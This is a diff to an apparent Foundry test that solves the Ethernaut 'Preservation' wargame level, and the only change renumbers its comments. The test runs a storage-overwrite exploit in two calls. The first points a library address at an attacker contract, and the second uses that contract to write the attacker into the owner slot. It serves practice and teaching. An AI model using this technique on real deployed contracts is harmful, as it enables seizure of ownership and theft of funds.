@@ -31,13 +31,13 @@ contract PreservationTest is Test {
     function testAttack() public {
         PreservationAttack attack = new PreservationAttack();
 
-        // set first library contract address to attacker contract
+        // 1. Set first library contract address to attacker contract
         preservation.setFirstTime(uint256(uint160(address(attack))));
 
-        // from our malicious contract override the required storage variables
+        // 2. From our malicious contract override the required storage variables
         preservation.setFirstTime(uint256(uint160(attacker)));
 
-        // Submit level
+        // 3. Submit level
         bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
         assertTrue(success, "Solution is not solving the level");
     }
